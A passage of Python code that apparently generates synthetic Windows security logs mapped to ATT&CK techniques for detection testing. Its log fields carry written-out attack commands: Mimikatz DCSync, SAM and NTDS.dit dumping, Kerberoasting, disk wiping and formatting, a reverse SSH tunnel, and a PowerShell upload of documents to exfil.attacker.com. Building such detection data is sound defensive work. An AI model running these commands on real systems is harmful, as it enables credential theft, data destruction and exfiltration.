                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "SourceProcessGUID": context.guid,
                    "SourceProcessId": str(context.pid),
                    "SourceThreadId": str(context.pid),
                    "SourceImage": "C:\\Users\\Public\\mimikatz.exe",
                    "TargetProcessGUID": "{00000000-0000-0000-0000-000000000728}",
                    "TargetProcessId": "728",
                    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                    "GrantedAccess": "0x1010",
                    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Users\\Public\\mimikatz.exe+1a234",
                    "SourceUser": f"{context.user_domain}\\{context.username}",
                    "TargetUser": "NT AUTHORITY\\SYSTEM",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.001",
            host=host.short_name,
            log_data=lsass_log,
            comment="Mimikatz LSASS access",
        )

    def _create_dcsync_log(self, host: HostConfig) -> None:
        """Create DCSync attack log."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Mimikatz DCSync
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\mimikatz.exe",
                    "CommandLine": f"mimikatz.exe \"lsadump::dcsync /domain:{context.domain} /user:krbtgt\" exit",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.006",
            host=host.short_name,
            log_data=sysmon_log,
            comment="DCSync attack (Mimikatz lsadump::dcsync)",
        )

        # Network connection to DC
        self.timestamp_gen.next()
        network_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\mimikatz.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIp": host.ip,
                    "SourcePort": str(random.randint(49152, 65535)),
                    "DestinationIp": "192.168.1.1",  # DC IP
                    "DestinationHostname": "DC01",
                    "DestinationPort": "389",  # LDAP
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.006",
            host=host.short_name,
            log_data=network_log,
            comment="DCSync LDAP connection to DC",
        )

    def _create_sam_dump_log(self, host: HostConfig) -> None:
        """Create SAM database dump log."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # reg.exe save SAM
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\reg.exe",
                    "CommandLine": "reg save HKLM\\SAM C:\\Users\\Public\\sam.save",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.002",
            host=host.short_name,
            log_data=sysmon_log,
            comment="SAM database dump via reg.exe",
        )

        # Also dump SYSTEM hive
        self.timestamp_gen.next()
        system_log = copy.deepcopy(sysmon_log)
        system_log["winlog"]["event_data"]["CommandLine"] = "reg save HKLM\\SYSTEM C:\\Users\\Public\\system.save"
        system_log["winlog"]["event_data"]["ProcessGuid"] = self.guid_registry.generate_guid(
            host=host.short_name, parent_guid=parent_guid, user="SYSTEM"
        )

        self._add_log(
            phase="credential-access",
            technique="T1003.002",
            host=host.short_name,
            log_data=system_log,
            comment="SYSTEM hive dump via reg.exe",
        )

    def _create_ntds_dump_log(self, host: HostConfig) -> None:
        """Create NTDS.dit extraction log (ntdsutil)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # ntdsutil IFM creation
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\ntdsutil.exe",
                    "CommandLine": 'ntdsutil "ac i ntds" "ifm" "create full C:\\temp\\ntds" q q',
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.003",
            host=host.short_name,
            log_data=sysmon_log,
            comment="NTDS.dit extraction via ntdsutil",
        )

        # File creation event
        self.timestamp_gen.next()
        file_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 11,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\ntdsutil.exe",
                    "TargetFilename": "C:\\temp\\ntds\\Active Directory\\ntds.dit",
                    "CreationUtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "User": "NT AUTHORITY\\SYSTEM",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.003",
            host=host.short_name,
            log_data=file_log,
            comment="NTDS.dit file created",
        )

    def _create_kerberoasting_log(self, host: HostConfig) -> None:
        """Create Kerberoasting attack log."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Rubeus kerberoast
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\Rubeus.exe",
                    "CommandLine": "Rubeus.exe kerberoast /outfile:C:\\Users\\Public\\hashes.txt",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "Hashes": "SHA256=ABCD1234EF5678901234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1558.003",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Kerberoasting via Rubeus",
        )

        # Kerberos TGS request network connection
        self.timestamp_gen.next()
        network_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\Rubeus.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIp": host.ip,
                    "SourcePort": str(random.randint(49152, 65535)),
                    "DestinationIp": "192.168.1.1",
                    "DestinationHostname": "DC01",
                    "DestinationPort": "88",  # Kerberos
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1558.003",
            host=host.short_name,
            log_data=network_log,
            comment="Kerberoasting TGS request to DC",
        )

    # ============================================================
    # Additional Discovery Techniques
    # ============================================================

    def _create_ad_recon_log(self, host: HostConfig) -> None:
        """Create Active Directory reconnaissance logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)

        commands = [
            ("nltest /dclist:", "T1018", "Domain controller enumeration"),
            ("dsquery user -limit 0", "T1087.002", "Domain user enumeration"),
            ("dsquery computer -limit 0", "T1018", "Domain computer enumeration"),
            ("net group \"Domain Admins\" /domain", "T1069.002", "Domain admin enumeration"),
            ("net group \"Enterprise Admins\" /domain", "T1069.002", "Enterprise admin enumeration"),
            ('wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname', "T1518.001", "Security software discovery"),
        ]

        for cmd, technique, comment in commands:
            context = self._get_render_context(host, parent_guid=parent_guid)

            image = "C:\\Windows\\System32\\net.exe"
            if cmd.startswith("nltest"):
                image = "C:\\Windows\\System32\\nltest.exe"
            elif cmd.startswith("dsquery"):
                image = "C:\\Windows\\System32\\dsquery.exe"
            elif cmd.startswith("wmic"):
                image = "C:\\Windows\\System32\\wbem\\WMIC.exe"

            sysmon_log = {
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": 1,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "computer_name": context.hostname,
                    "event_data": {
                        "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                        "ProcessGuid": context.guid,
                        "ProcessId": str(context.pid),
                        "Image": image,
                        "CommandLine": cmd,
                        "CurrentDirectory": "C:\\Windows\\System32\\",
                        "User": f"{context.user_domain}\\{context.username}",
                        "IntegrityLevel": "High",
                        "ParentProcessGuid": parent_guid,
                        "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="discovery",
                technique=technique,
                host=host.short_name,
                log_data=sysmon_log,
                comment=comment,
            )
            self.timestamp_gen.next()
            parent_guid = context.guid

    # ============================================================
    # Impact Techniques (Data Destruction, Disk Wipe, Defacement)
    # ============================================================

    def _create_data_destruction_log(self, host: HostConfig) -> None:
        """Create data destruction logs (sdelete, cipher /w)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # SDelete secure deletion
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\sdelete64.exe",
                    "CommandLine": "sdelete64.exe -p 3 -s C:\\Users\\*\\Documents\\*",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1485",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Data destruction via SDelete",
        )

        # Cipher /w overwrite free space
        self.timestamp_gen.next()
        cipher_context = self._get_render_context(host, parent_guid=context.guid)
        cipher_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": cipher_context.hostname,
                "event_data": {
                    "UtcTime": cipher_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": cipher_context.guid,
                    "ProcessId": str(cipher_context.pid),
                    "Image": "C:\\Windows\\System32\\cipher.exe",
                    "CommandLine": "cipher.exe /w:C:",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "ParentProcessGuid": context.guid,
                    "ParentProcessId": str(context.pid),
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": cipher_context.agent_name, "id": cipher_context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1485",
            host=host.short_name,
            log_data=cipher_log,
            comment="Free space overwrite via cipher.exe",
        )

    def _create_disk_wipe_log(self, host: HostConfig) -> None:
        """Create disk wipe logs (format, diskpart)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Diskpart clean
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\diskpart.exe",
                    "CommandLine": "diskpart.exe /s C:\\temp\\wipe.txt",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1561.002",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Disk wipe via diskpart",
        )

        # Format command
        self.timestamp_gen.next()
        format_context = self._get_render_context(host, parent_guid=context.guid)
        format_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": format_context.hostname,
                "event_data": {
                    "UtcTime": format_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": format_context.guid,
                    "ProcessId": str(format_context.pid),
                    "Image": "C:\\Windows\\System32\\format.com",
                    "CommandLine": "format D: /fs:NTFS /q /y",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "ParentProcessGuid": context.guid,
                    "ParentProcessId": str(context.pid),
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": format_context.agent_name, "id": format_context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1561.002",
            host=host.short_name,
            log_data=format_log,
            comment="Disk format command",
        )

    def _create_defacement_log(self, host: HostConfig) -> None:
        """Create defacement logs (web server modification)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Echo redirect to index.html
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine": 'cmd.exe /c echo "HACKED BY THREAT ACTOR" > C:\\inetpub\\wwwroot\\index.html',
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1491.001",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Internal defacement (web server)",
        )

        # File modification event
        self.timestamp_gen.next()
        file_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 11,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "TargetFilename": "C:\\inetpub\\wwwroot\\index.html",
                    "CreationUtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "User": "NT AUTHORITY\\SYSTEM",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1491.001",
            host=host.short_name,
            log_data=file_log,
            comment="Defacement file modification",
        )

    # ============================================================
    # Exfiltration & C2 Techniques
    # ============================================================

    def _create_dns_tunneling_log(self, host: HostConfig) -> None:
        """Create DNS tunneling exfiltration logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        c2_domain = context.c2_domain or "data.exfil-cdn.com"

        # Sysmon Event 22 - DNS Query for encoded data
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 22,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "RuleName": "technique_id=T1071.004,technique_name=DNS Tunneling",
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "QueryName": f"YWRtaW46cGFzc3dvcmQ.{c2_domain}",  # Base64 encoded data
                    "QueryStatus": "0",
                    "QueryResults": "::ffff:185.220.101.1",
                    "Image": "C:\\Windows\\System32\\nslookup.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="exfiltration",
            technique="T1048.003",
            host=host.short_name,
            log_data=sysmon_log,
            comment="DNS tunneling exfiltration",
        )

        # Multiple DNS queries (typical of tunneling)
        for i in range(3):
            self.timestamp_gen.next()
            query_context = self._get_render_context(host, parent_guid=context.guid)
            query_log = copy.deepcopy(sysmon_log)
            query_log["winlog"]["event_data"]["QueryName"] = f"chunk{i}_{random.randint(1000,9999)}.{c2_domain}"
            query_log["winlog"]["event_data"]["UtcTime"] = query_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            query_log["winlog"]["event_data"]["ProcessGuid"] = query_context.guid

            self._add_log(
                phase="exfiltration",
                technique="T1048.003",
                host=host.short_name,
                log_data=query_log,
                comment=f"DNS tunneling chunk {i+1}",
            )

    def _create_encrypted_channel_log(self, host: HostConfig) -> None:
        """Create encrypted C2 channel logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        c2_ip = context.c2_ip or "185.220.101.50"

        # HTTPS beacon connection
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "RuleName": "technique_id=T1573,technique_name=Encrypted Channel",
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\beacon.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIsIpv6": "false",
                    "SourceIp": host.ip,
                    "SourceHostname": host.hostname,
                    "SourcePort": str(random.randint(49152, 65535)),
                    "DestinationIsIpv6": "false",
                    "DestinationIp": c2_ip,
                    "DestinationPort": "443",
                    "DestinationHostname": context.c2_domain or "update-cdn.com",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="command-and-control",
            technique="T1573.002",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Encrypted C2 channel (HTTPS beacon)",
        )

        # Additional beacons at regular intervals
        for i in range(2):
            self.timestamp_gen.next()
            beacon_context = self._get_render_context(host, parent_guid=context.guid)
            beacon_log = copy.deepcopy(sysmon_log)
            beacon_log["winlog"]["event_data"]["UtcTime"] = beacon_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            beacon_log["winlog"]["event_data"]["ProcessGuid"] = beacon_context.guid
            beacon_log["winlog"]["event_data"]["SourcePort"] = str(random.randint(49152, 65535))

            self._add_log(
                phase="command-and-control",
                technique="T1573.002",
                host=host.short_name,
                log_data=beacon_log,
                comment=f"Encrypted C2 beacon {i+2}",
            )

    def _create_protocol_tunneling_log(self, host: HostConfig) -> None:
        """Create protocol tunneling logs (SSH, ICMP tunneling)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # plink.exe SSH tunnel
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\plink.exe",
                    "CommandLine": "plink.exe -ssh -R 8080:127.0.0.1:80 attacker@185.220.101.50",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "Hashes": "SHA256=1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="command-and-control",
            technique="T1572",
            host=host.short_name,
            log_data=sysmon_log,
            comment="SSH tunnel via plink.exe",
        )

        # Network connection for tunnel
        self.timestamp_gen.next()
        net_context = self._get_render_context(host, parent_guid=context.guid)
        net_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": net_context.hostname,
                "event_data": {
                    "UtcTime": net_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\plink.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIp": host.ip,
                    "SourcePort": str(random.randint(49152, 65535)),
                    "DestinationIp": "185.220.101.50",
                    "DestinationPort": "22",  # SSH
                },
            },
            "agent": {"name": net_context.agent_name, "id": net_context.agent_id},
        }

        self._add_log(
            phase="command-and-control",
            technique="T1572",
            host=host.short_name,
            log_data=net_log,
            comment="SSH tunnel connection",
        )

    def _create_exfil_over_c2_log(self, host: HostConfig) -> None:
        """Create exfiltration over C2 channel logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # PowerShell uploading data over HTTPS
        ps_log = {
            "winlog": {
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "event_id": 4104,
                "provider_name": "Microsoft-Windows-PowerShell",
                "computer_name": context.hostname,
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "1",
                    "ScriptBlockText": "$data = Get-Content C:\\Users\\*\\Documents\\*.docx -Raw; Invoke-WebRequest -Uri https://exfil.attacker.com/upload -Method POST -Body $data",
                    "ScriptBlockId": context.guid,
                    "Path": "",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="exfiltration",
            technique="T1041",
            host=host.short_name,
            log_data=ps_log,
            comment="Exfiltration over C2 channel",
        )

        # Network connection for exfil
        self.timestamp_gen.next()
        net_context = self._get_render_context(host, parent_guid=context.guid)
        net_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": net_context.hostname,
                "event_data": {
                    "UtcTime": net_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": net_context.guid,
                    "ProcessId": str(net_context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIp": host.ip,
                    "SourcePort": str(random.randint(49152, 65535)),
                    "DestinationIp": "185.220.101.100",
                    "DestinationHostname": "exfil.attacker.com",
                    "DestinationPort": "443",
                },
            },
            "agent": {"name": net_context.agent_name, "id": net_context.agent_id},
        }

        self._add_log(
            phase="exfiltration",
            technique="T1041",
            host=host.short_name,
            log_data=net_log,
            comment="Exfiltration network connection",
        )

    # ============================================================
    # Collection Techniques
    # ============================================================

    def _create_screenshot_log(self, host: HostConfig) -> None:
        """Create screenshot capture logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # PowerShell screenshot script
        ps_log = {
            "winlog": {
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "event_id": 4104,
                "provider_name": "Microsoft-Windows-PowerShell",
                "computer_name": context.hostname,
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "1",
                    "ScriptBlockText": "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen | ForEach-Object { $bitmap = New-Object System.Drawing.Bitmap($_.Bounds.Width, $_.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($_.Bounds.Location, [System.Drawing.Point]::Empty, $_.Bounds.Size); $bitmap.Save('C:\\Users\\Public\\screenshot.png')}",
                    "ScriptBlockId": context.guid,
                    "Path": "",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1113",
            host=host.short_name,
            log_data=ps_log,
            comment="Screenshot capture via PowerShell",
        )

        # File creation for screenshot
        self.timestamp_gen.next()
        file_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 11,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "TargetFilename": "C:\\Users\\Public\\screenshot.png",
                    "CreationUtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "User": f"{context.user_domain}\\{context.username}",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1113",
            host=host.short_name,
            log_data=file_log,
            comment="Screenshot file created",
        )

    def _create_keylogger_log(self, host: HostConfig) -> None:
        """Create keylogger logs (input capture)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Keylogger process
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\keylog.exe",
                    "CommandLine": "keylog.exe -o C:\\Users\\Public\\keystrokes.log",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
